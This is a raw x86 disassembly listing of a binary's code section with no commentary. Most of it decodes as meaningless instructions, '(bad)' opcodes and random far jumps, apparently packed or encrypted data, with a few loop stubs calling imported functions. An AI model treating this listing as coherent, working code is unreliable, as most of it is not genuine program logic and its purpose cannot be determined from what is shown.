  401890:	inc    esp
  401891:	dec    esi
  401892:	inc    edi
  401893:	sbb    esi,DWORD PTR [edi]
  401895:	jg     0x4018ff
  401897:	mov    ds:0xfaa69d16,al
  40189c:	mov    ebx,0x1d617289
  4018a1:	xchg   BYTE PTR ds:0xf6cd66ac,ah
  4018a7:	sbb    bl,BYTE PTR [esi-0xc439002]
  4018ad:	rol    bh,1
  4018af:	test   cl,cl
  4018b1:	call   0x556e:0xd660531c
  4018b8:	shl    DWORD PTR [eax+eiz*4],0x52
  4018bc:	lea    edx,[esi+ecx*4]
  4018bf:	rcl    DWORD PTR [eax-0x77],cl
  4018c2:	add    DWORD PTR [ebp-0x14dd9fe3],eax
  4018c8:	mov    edi,0xa284c4d0
  4018cd:	cmp    eax,0x2ee34aed
  4018d2:	ror    BYTE PTR [eax-0x4c],cl
  4018d5:	jp     0x401926
  4018d7:	and    eax,0x99314257
  4018dc:	adc    BYTE PTR [ebx+0x60],dl
  4018df:	jno    0x401948
  4018e1:	fidivr DWORD PTR [esp+eax*1+0x7ea00a]
  4018e8:	pop    eax
  4018e9:	mul    dh
  4018eb:	in     al,dx
  4018ec:	mov    DWORD PTR [ebp-0x2c23f66],edi
  4018f2:	fdiv   st,st(0)
  4018f4:	cwde   
  4018f5:	in     eax,0x1a
  4018f7:	jp     0x401904
  4018f9:	call   0x4ee6:0xdc3bd374
  401900:	dec    esi
  401901:	fdivr  DWORD PTR [esi-0x329c8266]
  401907:	outs   dx,BYTE PTR ds:[esi]
  401908:	pop    ss
  401909:	sar    ebp,cl
  40190b:	jbe    0x401898
  40190d:	sbb    esp,edi
  40190f:	xor    BYTE PTR [edi+0xc],bh
  401912:	popf   
  401913:	xchg   edx,eax
  401914:	adc    ebp,DWORD PTR [edi+0x1b83c815]
  40191a:	inc    esi
  40191b:	sbb    bl,BYTE PTR [eax+0x74]
  40191e:	dec    ebp
  40191f:	js     0x401995
  401921:	in     eax,0x81
  401923:	jl     0x4018f3
  401925:	inc    esp
  401926:	arpl   WORD PTR ds:0x6e01b3a9,di
  40192c:	mov    dh,0xca
  40192e:	(bad)  
  40192f:	jns    0x401947
  401931:	retf   0xbc1a
  401934:	adc    eax,0x54e07aff
  401939:	mov    edi,0xe23364cc
  40193e:	rcr    BYTE PTR [ebx+0x43],1
  401941:	fisubr WORD PTR [edx]
  401943:	frstor [ecx-0x47de5ba3]
  401949:	push   ebx
  40194a:	sbb    ebp,DWORD PTR [ecx+ebx*8+0x72]
  40194e:	les    ecx,FWORD PTR [eax]
  401950:	xchg   edx,eax
  401951:	dec    ecx
  401952:	out    dx,al
  401953:	jnp    0x401999
  401955:	mov    dh,0xef
  401957:	stc    
  401958:	arpl   WORD PTR [edx+0x20],sp
  40195b:	adc    bl,ah
  40195d:	sub    ch,dl
  40195f:	or     dh,BYTE PTR [edi-0x41baba85]
  401965:	mov    edi,esp
  401967:	pop    ecx
  401968:	adc    eax,0xb105b8a7
  40196d:	xchg   esp,eax
  40196e:	and    BYTE PTR [esi],dl
  401970:	dec    edx
  401971:	adc    eax,0xee36ac27
  401976:	pop    esp
  401977:	jbe    0x4019eb
  401979:	jl     0x401916
  40197b:	xor    eax,0x7488c00
  401980:	lea    ecx,[esi+0x189c703]
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019a4:	and    bh,BYTE PTR [ecx]
  4019a6:	into   
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019fe
  4019b0:	lahf   
  4019b1:	dec    eax
  4019b2:	mov    DWORD PTR [ecx],esi
  4019b4:	bound  esp,QWORD PTR [ebx+0xda6d698]
  4019ba:	rol    DWORD PTR [esi],cl
  4019bc:	or     al,0x41
  4019be:	mov    ecx,0x5440d217
  4019c3:	fisubr DWORD PTR [ebx]
  4019c5:	sub    BYTE PTR [esi],dh
  4019c7:	jmp    0xec3d:0x8d12a04b
  4019ce:	mov    ecx,0xaaeebce6
  4019d3:	jmp    0x4019b0
  4019d5:	loopne 0x401a2b
  4019d7:	cmp    DWORD PTR [ebx+0x59feac2],0xcd470ba4
  4019e1:	mul    BYTE PTR [esi+0x2f]
  4019e4:	sti    
  4019e5:	mov    bh,0x7c
  4019e7:	cld    
  4019e8:	jp     0x4019f0
  4019ea:	xchg   ecx,eax
  4019eb:	aas    
  4019ec:	mov    esp,0x3bbac994
  4019f1:	pop    esp
  4019f2:	repnz arpl bx,bp
  4019f5:	sahf   
  4019f6:	into   
  4019f7:	add    BYTE PTR [esi-0x37],dl
  4019fa:	pop    ds
  4019fb:	rcr    DWORD PTR [esi-0x5f],cl
  4019fe:	aad    0x9c
  401a00:	das    
  401a01:	(bad)  
  401a02:	adc    al,0x2d
  401a04:	xchg   BYTE PTR [ebp+0x792e87d1],dl
  401a0a:	add    cl,0xe4
  401a0d:	aad    0x94
  401a0f:	addr16 push esi
  401a11:	bound  ecx,QWORD PTR [edx+edx*1]
  401a14:	lods   eax,DWORD PTR ds:[esi]
  401a15:	test   DWORD PTR [edx-0x3e0e2c3d],esp
  401a1b:	mov    esp,0xad6b30f
  401a20:	out    dx,al
  401a21:	(bad)  
  401a22:	neg    BYTE PTR [edx-0x6e]
  401a25:	repnz and eax,0x89da21c3
  401a2b:	std    
  401a2c:	xor    esp,edx
  401a2e:	push   eax
  401a2f:	mov    bh,0x30
  401a31:	push   ebx
  401a32:	jbe    0x401a0e
  401a34:	jp     0x401a67
  401a36:	xchg   edi,eax
  401a37:	dec    ebp
  401a38:	arpl   di,dx
  401a3a:	sub    edi,DWORD PTR [ecx]
  401a3c:	js     0x4019cc
  401a3e:	mov    al,ds:0xfcd08d17
  401a43:	arpl   si,di
  401a45:	cmp    BYTE PTR [eax-0x66c565cb],bl
  401a4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a4c:	test   ebp,edx
  401a4e:	xor    eax,0x9a0ec1de
  401a53:	sub    edi,edx
  401a55:	lods   al,BYTE PTR ds:[esi]
  401a56:	cmp    esp,edi
  401a58:	ror    edi,1
  401a5a:	push   ebp
  401a5b:	repz or al,0x93
  401a5f:	cmc    
  401a60:	loop   0x401ac1
  401a62:	add    eax,0xb2360637
  401a67:	ret    
  401a68:	and    al,0xa7
  401a6a:	sub    dl,dh
  401a6c:	mov    ecx,0x11786d3e
  401a71:	lahf   
  401a72:	add    esp,ecx
  401a74:	es popa 
  401a76:	mov    edx,0x24ea1974
  401a7b:	int3   
  401a7c:	sbb    ch,al
  401a7e:	adc    ch,dl
  401a80:	jg     0x401a55
  401a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a83:	ins    DWORD PTR es:[edi],dx
  401a84:	lahf   
  401a85:	jp     0x401a66
  401a87:	sbb    dl,BYTE PTR [edx]
  401a89:	popa   
  401a8a:	out    dx,eax
  401a8b:	add    DWORD PTR [edi],esp
  401a8d:	fwait
  401a8e:	dec    ebp
  401a8f:	push   ebx
  401a90:	xchg   DWORD PTR [edi+0x3b],ebp
  401a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a94:	fistp  QWORD PTR [esi+0x5c]
  401a97:	inc    esi
  401a98:	test   bl,ch
  401a9a:	mov    ah,0x6e
  401a9c:	outs   dx,DWORD PTR ds:[esi]
  401a9d:	es inc ebp
  401a9f:	js     0x401a47
  401aa1:	scas   al,BYTE PTR es:[edi]
  401aa2:	stc    
  401aa3:	mov    edi,0x465b4103
  401aa8:	or     ecx,esi
  401aaa:	and    esi,DWORD PTR [eax-0x4a]
  401aad:	cmp    al,0xc8
  401aaf:	rol    DWORD PTR [edi],cl
  401ab1:	xlat   BYTE PTR ds:[ebx]
  401ab2:	addr16 out 0x6d,eax
  401ab5:	jmp    0x401aba
  401ab7:	dec    edi
  401ab8:	push   es
  401ab9:	repz mov ecx,0x1eac3a7
  401abf:	fsubr  DWORD PTR [edi]
  401ac1:	or     DWORD PTR ss:[esi],edi
  401ac4:	push   esp
  401ac5:	and    al,0x89
  401ac7:	ins    BYTE PTR es:[edi],dx
  401ac8:	test   al,0x45
  401aca:	pushf  
  401acb:	sbb    bh,dh
  401acd:	das    
  401ace:	xor    al,0x2d
  401ad0:	and    eax,0x99bf5d18
  401ad5:	xor    cl,bl
  401ad7:	mov    edx,0x6d51890c
  401adc:	add    ch,bl
  401ade:	loopne 0x401acc
  401ae0:	fist   DWORD PTR [ebx+0x390f6c1a]
  401ae6:	xchg   esi,eax
  401ae7:	cmp    eax,0xca473daa
  401aec:	stos   DWORD PTR es:[edi],eax
  401aed:	pop    ebp
  401aee:	scas   eax,DWORD PTR es:[edi]
  401aef:	pop    ecx
  401af0:	push   esi
  401af1:	push   esp
  401af2:	push   ebx
  401af3:	push   ss
  401af4:	lods   al,BYTE PTR ds:[esi]
  401af5:	shl    DWORD PTR [esi],cl
  401af7:	or     BYTE PTR [edi-0x2d25fd9b],dh
  401afd:	pop    ebp
  401afe:	and    eax,0x8fb60df
  401b03:	in     al,dx
  401b04:	out    dx,eax
  401b05:	inc    eax
  401b06:	mov    eax,ds:0x43da4ed4
  401b0b:	push   esp
  401b0c:	ja     0x401b6d
  401b0e:	pop    ebp
  401b0f:	pop    ebp
  401b10:	or     ebp,ecx
  401b12:	addr16 (bad) 
  401b15:	cmp    eax,0xa5954317
  401b1a:	nop
  401b1b:	(bad)  
  401b1c:	push   ebp
  401b1d:	add    al,0xe2
  401b1f:	test   DWORD PTR [edx+ebp*8-0x1],eax
  401b23:	(bad)  
  401b26:	jmp    0xfe2a:0xc6f1ad77
  401b2d:	aad    0x4d
  401b2f:	add    DWORD PTR [edi-0x17],esp
  401b32:	pop    esp
  401b33:	mov    ebx,0x4225524e
  401b38:	xchg   ebx,eax
  401b39:	pop    edi
  401b3a:	out    0x2f,eax
  401b3c:	daa    
  401b3d:	xchg   edx,eax
  401b3e:	inc    DWORD PTR [edx+0x3d50c1f2]
  401b44:	repz inc edi
  401b46:	sahf   
  401b47:	nop
  401b48:	mov    es,WORD PTR [edi+0x63]
  401b4b:	ficom  DWORD PTR [eax+0x7b]
  401b4e:	pushf  
  401b4f:	lock or al,0x9
  401b52:	dec    ebp
  401b53:	cmp    al,0xbe
  401b55:	dec    esp
  401b56:	test   BYTE PTR [esi+0x1ccdb9eb],ah
  401b5c:	cmp    BYTE PTR [ecx],al
  401b5e:	pop    esi
  401b5f:	nop
  401b60:	mov    al,ds:0xe1752b4e
  401b65:	je     0x401bca
  401b67:	mov    ds,WORD PTR [ebx+0x5b]
  401b6a:	mov    bl,0x4b
  401b6c:	adc    ebp,edi
  401b6e:	xor    BYTE PTR [eax],0xc2
  401b71:	(bad)  
  401b72:	fsub   st,st(6)
  401b74:	retf   
  401b75:	call   0x2d4b:0x4cbd2f3a
  401b7c:	loope  0x401b90
  401b7e:	arpl   WORD PTR [esi],ax
  401b80:	jnp    0x401b39
  401b82:	pop    edi
  401b83:	or     eax,0xb88ec7b9
  401b88:	das    
  401b89:	sbb    ch,0x31
  401b8c:	sub    DWORD PTR [ecx+ebx*2-0x33],0x1c
  401b91:	in     al,0x65
  401b93:	pop    esi
  401b94:	(bad)  
  401b96:	mov    ebx,0xd94c02c2
  401b9b:	pusha  
  401b9c:	cmc    
  401b9d:	dec    edi
  401b9e:	adc    DWORD PTR [ebx],edi
  401ba0:	daa    
  401ba1:	test   eax,0x5582c93
  401ba6:	jo     0x8eae9e1f
  401bac:	jl     0x401b93
  401bae:	sub    dh,dl
  401bb0:	rcr    DWORD PTR [ebx+0x6af7ef23],0x96
  401bb7:	fcom   QWORD PTR [edi+0x44]
  401bba:	xlat   BYTE PTR ds:[ebx]
  401bbb:	sbb    DWORD PTR [edx+eiz*2],edx
  401bbe:	out    0x8d,al
  401bc0:	(bad)  
  401bc2:	xchg   esp,eax
  401bc3:	js     0x401c35
  401bc5:	add    eax,0x267babe4
  401bca:	rcr    DWORD PTR [ecx-0x2b],cl
  401bcd:	mov    eax,ds:0xf7c60341
  401bd2:	dec    edx
  401bd3:	or     BYTE PTR [ebx-0x29],al
  401bd6:	inc    ebx
  401bd7:	jmp    0x31b4:0x9e17fb89
  401bde:	(bad)  
  401bdf:	mov    ebp,0x117a8300
  401be4:	stos   DWORD PTR es:[edi],eax
  401be5:	mov    ebp,0x55da9182
  401bea:	rcr    DWORD PTR [ebp+0x1cd0725f],0x3d
  401bf1:	loopne 0x401c1f
  401bf3:	ret    0x8ff8
  401bf6:	xchg   DWORD PTR [esi],edi
  401bf8:	xor    DWORD PTR [eax+0x7f],ebx
  401bfb:	pop    esp
  401bfc:	jmp    0xc2fc8655
  401c01:	ror    esi,cl
  401c03:	adc    al,0x81
  401c05:	pusha  
  401c06:	jne    0x401c2e
  401c08:	mov    ebp,0x736f6264
  401c0d:	cmp    BYTE PTR [esi+0x24],al
  401c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c11:	cli    
  401c12:	test   eax,0xf55e21d8
  401c17:	adc    edi,0xffffffd8
  401c1a:	mov    ds:0xb88bd6b8,al
  401c1f:	push   es
  401c20:	cli    
  401c21:	push   ss
  401c22:	xchg   edx,eax
  401c24:	inc    edi
  401c25:	fs xor al,0x3c
  401c28:	xchg   esp,eax
  401c29:	xor    DWORD PTR [eax+0x72],ebx
  401c2c:	ds repnz sbb bl,ah
  401c30:	retf   0x4589
  401c33:	loopne 0x401bb6
  401c35:	and    eax,0x42afbd
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	add    BYTE PTR [eax],al
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42afbd
  401c48:	inc    eax
  401c49:	mov    ds:0x42afbd,eax
  401c4e:	cmp    DWORD PTR ds:0x42afbd,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42afbd,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42b1ae
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42afbd,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42afbd
  401c90:	inc    eax
  401c91:	mov    ds:0x42afbd,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42aee1,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42aef5
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42aee9
  401cbe:	and    eax,DWORD PTR ds:0x42af39
  401cc4:	mov    ds:0x42aee9,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42af79,0x42af81
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42aefd,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0x9cba
  401d05:	xchg   edi,eax
  401d06:	out    dx,al
  401d07:	aaa    
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d8a
  401d11:	fwait
  401d12:	mov    es,WORD PTR [edi]
  401d14:	adc    bl,dl
  401d16:	aas    
  401d17:	lock xchg edx,eax
  401d19:	pop    ebp
  401d1a:	jge    0x401c9c
  401d1c:	add    BYTE PTR [ebp+0x41f372e5],al
  401d22:	inc    esp
  401d23:	fdivr  st,st(6)
  401d25:	add    al,0x6b
  401d27:	cmp    ecx,ecx
  401d29:	cdq    
  401d2a:	shl    BYTE PTR [ebx-0x68],1
  401d2d:	mov    edx,esi
  401d2f:	sub    al,0x4e
  401d31:	lods   al,BYTE PTR ds:[esi]
  401d32:	gs and al,0xc3
  401d35:	into   
  401d36:	push   ebp
  401d37:	enter  0x9b1f,0xe3
  401d3b:	gs cli 
  401d3d:	(bad)  
  401d3f:	aas    
  401d40:	add    dl,BYTE PTR ds:0x5a50ae2e
  401d46:	emms   
  401d48:	fst    QWORD PTR [edi]
  401d4a:	add    BYTE PTR [edx+0x229dbe0a],bl
  401d50:	jae    0x401d88
  401d52:	fstp   DWORD PTR [ebx+0xb]
  401d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d56:	call   0xb0fe8b6f
  401d5b:	ret    0x6005
  401d5e:	xor    eax,0x488b28d1
  401d63:	scas   al,BYTE PTR es:[edi]
  401d64:	iret   
  401d65:	sub    bh,cl
  401d67:	dec    esp
  401d68:	(bad)  
  401d69:	out    dx,eax
  401d6a:	stos   DWORD PTR es:[edi],eax
  401d6b:	mov    DWORD PTR ds:0xb459ed3e,ebp
  401d71:	lods   al,BYTE PTR ds:[esi]
  401d72:	mov    ds:0x33955da7,eax
  401d77:	push   ebx
  401d78:	ds cdq 
  401d7a:	xchg   DWORD PTR [esi+0x5f7d0cfd],ebx
  401d80:	outs   dx,BYTE PTR ds:[esi]
  401d81:	icebp  
  401d82:	xchg   ecx,eax
  401d83:	in     eax,dx
  401d84:	sbb    DWORD PTR [edx-0x4f90da4a],edi
  401d8a:	push   fs
  401d8c:	pop    ebp
  401d8d:	xor    eax,DWORD PTR [ebx-0x28]
  401d90:	xchg   edx,eax
  401d91:	cmp    BYTE PTR [ecx+0x20dc4775],al
  401d97:	sub    eax,0xf07f8891
  401d9c:	fs xchg ecx,eax
  401d9e:	adc    dh,ch
  401da0:	xor    cl,dl
  401da2:	cs cli 
  401da4:	and    cl,bl
  401da6:	push   ebx
  401da7:	or     edx,esp
  401da9:	(bad)  
  401daa:	in     eax,dx
  401dab:	dec    eax
  401dac:	shl    BYTE PTR [edx],0x6f
  401daf:	jmp    0x96:0x52a5bf4
  401db6:	sbb    bh,BYTE PTR [ebx]
  401db8:	xor    al,0x22
  401dba:	add    esp,edx
  401dbc:	fisubr WORD PTR [eax+0x1fa3861d]
  401dc2:	loope  0x401da0
  401dc4:	push   esp
  401dc5:	xchg   esp,eax
  401dc6:	mov    ds:0x35455b1f,al
  401dcb:	ret    0x1dba
  401dce:	dec    ecx
  401dcf:	inc    eax
  401dd0:	or     eax,0xade38f4d
  401dd5:	inc    ebp
  401dd6:	mov    ebx,0x1e22ab5b
  401ddb:	add    ebx,DWORD PTR [ebp+eiz*8+0x40]
  401ddf:	cwde   
  401de0:	mov    ah,0xf6
  401de2:	mov    ah,0x80
  401de4:	daa    
  401de5:	add    DWORD PTR [edi+0x5477a157],eax
  401deb:	add    eax,DWORD PTR [edi-0xc34beeb]
  401df1:	push   edx
  401df2:	repnz iret 
  401df4:	icebp  
  401df5:	imul   edx,DWORD PTR [esi-0x378daa61],0xffffffa5
  401dfc:	jo     0x401e4a
  401dfe:	xchg   edi,eax
  401dff:	gs pop edx
  401e01:	imul   edx,DWORD PTR [ebp-0x4b],0x316d62e8
  401e08:	xchg   esp,eax
  401e09:	mov    ds,esp
  401e0b:	bnd je 0x401e7d
  401e0e:	int    0x8f
  401e10:	aad    0xa
  401e12:	repnz dec eax
  401e14:	cwde   
  401e15:	inc    edi
  401e16:	sbb    BYTE PTR ds:0x99d2ca7d,bl
  401e1c:	push   esp
  401e1d:	es icebp 
  401e1f:	hlt    
  401e20:	ret    0x28ad
  401e23:	pop    ds
  401e24:	inc    ebx
  401e25:	pop    ds
  401e26:	pop    edx
  401e27:	pop    edx
  401e28:	or     al,0x85
  401e2a:	cmc    
  401e2b:	cmp    dh,BYTE PTR [eax]
  401e2d:	stc    
  401e2e:	jmp    0x9995:0x71ae5cc9
  401e35:	xchg   al,bh
  401e37:	gs nop
  401e39:	adc    eax,0x83084abb
  401e3e:	adc    BYTE PTR [eax+0x2bcb11dc],ch
  401e44:	xor    dh,BYTE PTR [eax-0x16]
  401e47:	int    0x64
  401e49:	cmc    
  401e4a:	out    dx,al
  401e4b:	(bad)
  401e4f:	popf   
  401e50:	lds    ebp,FWORD PTR [ecx]
  401e52:	lods   al,BYTE PTR ds:[esi]
  401e53:	push   esi
  401e54:	xchg   ebx,eax
  401e55:	add    eax,0xa451bead
  401e5a:	sub    ebp,DWORD PTR [ecx+edi*2+0x5e]
  401e5e:	push   ecx
  401e5f:	jnp    0x401e06
  401e61:	cmp    al,BYTE PTR [ebx+0x2]
  401e64:	sbb    al,0x7d
  401e66:	in     al,dx
  401e67:	cmc    
  401e68:	dec    edx
  401e69:	cmp    eax,0x7b87427e
  401e6e:	cs jb  0x401e2f
  401e71:	int3   
  401e72:	push   cs
  401e73:	shl    DWORD PTR [edx+0x47e49d68],cl
  401e79:	add    al,0x4d
  401e7b:	fsub   DWORD PTR [edi+0x3a]
  401e7e:	xor    DWORD PTR [edi+0x5cfbe2b8],0x55ea4f03
  401e88:	and    al,0x2
  401e8a:	cmp    bl,dh
  401e8c:	mov    esp,0xb9c17248
  401e91:	(bad)  [edx-0x5e037b4e]
  401e97:	scas   eax,DWORD PTR es:[edi]
  401e98:	cdq    
  401e99:	mov    al,gs:0xc8596e36
  401e9f:	sbb    DWORD PTR [esi-0x4dfd444e],edi
  401ea5:	adc    esp,DWORD PTR [ebx+0x26]
  401ea8:	je     0x401eea
  401eaa:	div    DWORD PTR [esi]
  401eac:	es jg  0x401ee9
  401eaf:	inc    edx
  401eb0:	out    0x99,al
  401eb2:	and    edx,ebx
  401eb4:	jecxz  0x401eff
  401eb6:	pop    edi
  401eb7:	fs mov al,0xb2
  401eba:	mov    ds:0x67dc8141,al
  401ebf:	lock call FWORD PTR [edi+0x1a10315c]
  401ec6:	dec    edi
  401ec7:	and    DWORD PTR [edi],edi
  401ec9:	bnd ja 0x401f35
  401ecc:	ror    DWORD PTR [ebx+esi*2+0x1a8bb651],cl
  401ed3:	aas    
  401ed4:	mov    ebp,0xae822d4d
  401ed9:	mov    ds:0x6bf51a1c,al
  401ede:	sbb    DWORD PTR [ebp+0x4],edi
  401ee1:	jb     0x401f4a
  401ee3:	add    al,0x5a
  401ee5:	adc    al,0x57
  401ee7:	icebp  
  401ee8:	jns    0x401edd
  401eea:	mov    esp,0xad290ae7
  401eef:	je     0x401e99
  401ef1:	pusha  
  401ef2:	pop    ebx
  401ef3:	mov    WORD PTR [eax],gs
  401ef5:	sbb    ebp,DWORD PTR [esi-0x51]
  401ef8:	mov    al,0xee
  401efa:	sar    BYTE PTR [edi-0x41b77dbf],cl
  401f00:	jnp    0x401f46
  401f02:	mov    bl,0x36
  401f04:	jns    0x401f7c
  401f06:	cmp    eax,0x83f5e695
  401f0b:	and    DWORD PTR [edx-0x10],0xffffffbd
  401f0f:	loop   0x401f02
  401f11:	addr16 retf 
  401f13:	pop    ds
  401f14:	into   
  401f15:	leave  
  401f16:	sbb    eax,0x7c30c951
  401f1b:	adc    DWORD PTR [esi],esi
  401f1d:	aam    0x16
  401f1f:	iret   
  401f20:	sahf   
  401f21:	dec    edx
  401f22:	mov    bh,0x70
  401f24:	jae    0x401ed6
  401f26:	dec    edi
  401f27:	cli    
  401f28:	out    0x35,al
  401f2a:	(bad)  
  401f2b:	(bad)  
  401f2c:	sub    esp,DWORD PTR [edi+0x5042b80]
  401f32:	or     eax,0xc87f9859
  401f37:	jbe    0x401f96
  401f39:	pop    edx
  401f3a:	shr    DWORD PTR [ecx],cl
  401f3c:	pop    ss
  401f3d:	out    dx,eax
  401f3e:	or     BYTE PTR [esi+0x2861d015],bl
  401f44:	cdq    
  401f45:	inc    esi
  401f46:	cmp    BYTE PTR [esi-0x3b74d462],ah
  401f4c:	sub    eax,0x30b6bc8d
  401f51:	push   edx
  401f52:	aas    
  401f53:	dec    ecx
  401f54:	add    BYTE PTR [ecx],bh
  401f56:	fsub   QWORD PTR [edi]
  401f58:	cmp    eax,0x506f8058
  401f5d:	add    BYTE PTR [esi-0x6bb97ccc],0xee
  401f64:	xchg   esp,eax
  401f65:	sbb    eax,DWORD PTR [esi-0x2b427707]
  401f6b:	fldl2t 
  401f6e:	xchg   DWORD PTR [esi],ecx
  401f70:	mov    ds:0x351835bf,ax
  401f76:	ins    BYTE PTR es:[edi],dx
  401f77:	dec    DWORD PTR [eax]
  401f79:	(bad)  
  401f7a:	sbb    eax,0xf382c41
  401f7f:	mov    bh,0x3b
  401f81:	fld    QWORD PTR [esp+esi*1]
  401f84:	mov    ds,edx
  401f86:	jne    0x401f4c
  401f88:	sbb    bl,BYTE PTR [ecx]
  401f8a:	sub    al,0xd9
  401f8c:	arpl   WORD PTR [esi],di
  401f8e:	sti    
  401f8f:	sbb    ebx,DWORD PTR [edi+0x33080347]
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	mov    ecx,0x230042af
  401f9d:	add    eax,0x42b009
  401fa2:	mov    ds:0x42afb9,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42af71,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42aed9,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42aed9
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42aed9,ecx
  401fd3:	cmp    DWORD PTR ds:0x42aed9,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42aed9,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR ds:0x86db1b93,esp
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x401fa8
  402024:	stos   BYTE PTR es:[edi],al
  402025:	dec    esi
  402026:	(bad)  
  402027:	icebp  
  402028:	into   
  402029:	bound  ebx,QWORD PTR [eax+0x3f]
  40202c:	das    
  40202d:	stc    
  40202e:	dec    ecx
  40202f:	mov    dl,0x6e
  402031:	gs pop bp
  402034:	mov    dl,0x78
  402036:	and    esi,DWORD PTR [esi]
  402038:	out    dx,al
  402039:	xor    eax,0x9836a50b
  40203e:	push   edx
  40203f:	popf   
  402040:	xchg   ecx,eax
  402041:	xchg   ebx,edi
  402043:	cmc    
  402044:	push   ebx
  402045:	out    dx,eax
  402046:	lds    edx,FWORD PTR [ebp+0x4d]
  402049:	cli    
  40204a:	cmp    BYTE PTR cs:[esi],0xb2
  40204e:	jp     0x401fe4
  402050:	stos   BYTE PTR es:[edi],al
  402051:	sbb    BYTE PTR [ecx],cl
  402053:	fistp  WORD PTR [ebx]
  402055:	popa   
  402056:	xchg   ecx,eax
  402057:	xchg   edx,eax
  402058:	out    dx,eax
  402059:	call   DWORD PTR [eax]
  40205b:	scas   eax,DWORD PTR es:[edi]
  40205c:	sub    al,0x4e
  40205e:	and    ebx,DWORD PTR [ecx+0x55]
  402061:	add    cl,ch
  402063:	mov    ds:0x4c382eb,eax
  402068:	shl    BYTE PTR [ebx-0x2560917d],1
  40206e:	stos   BYTE PTR es:[edi],al
  40206f:	lods   eax,DWORD PTR ds:[esi]
  402070:	lods   eax,DWORD PTR ds:[esi]
  402071:	out    0xe8,eax
  402073:	loope  0x402007
  402075:	popa   
  402076:	pop    es
  402077:	fincstp 
  402079:	in     al,dx
  40207a:	test   DWORD PTR [eax],edx
  40207c:	into   
  40207d:	(bad)  
  40207e:	es mov eax,0x372f5a9f
  402084:	pop    ds
  402085:	sbb    al,0x30
  402087:	dec    esp
  402088:	cli    
  402089:	(bad)  
  40208a:	fst    QWORD PTR [ecx+ebx*8]
  40208d:	out    dx,eax
  40208e:	and    al,0xd0
  402090:	ins    DWORD PTR es:[edi],dx
  402091:	mov    dh,0x41
  402093:	xchg   ebp,eax
  402094:	in     eax,0x4
  402096:	mov    ch,0x6e
  402098:	ds into 
  40209a:	jmp    0x1ce1ddff
  40209f:	stc    
  4020a0:	pop    edx
  4020a1:	xor    dh,dl
  4020a3:	mov    ebx,0x8283443d
  4020a8:	mov    ds,WORD PTR [esp+ecx*4+0x39d56c6]
  4020af:	sub    edi,ecx
  4020b1:	fcmovnbe st,st(1)
  4020b3:	xchg   esp,eax
  4020b4:	das    
  4020b5:	fsubr  st(7),st
  4020b7:	aas    
  4020b8:	mov    cl,0x30
  4020ba:	sahf   
  4020bb:	xchg   esp,eax
  4020bc:	sub    ebp,DWORD PTR [edx+ecx*2-0x479164b4]
  4020c3:	pop    ss
  4020c4:	fidiv  DWORD PTR [eax-0x31]
  4020c7:	mov    ah,0x5a
  4020c9:	aam    0x31
  4020cb:	inc    ebp
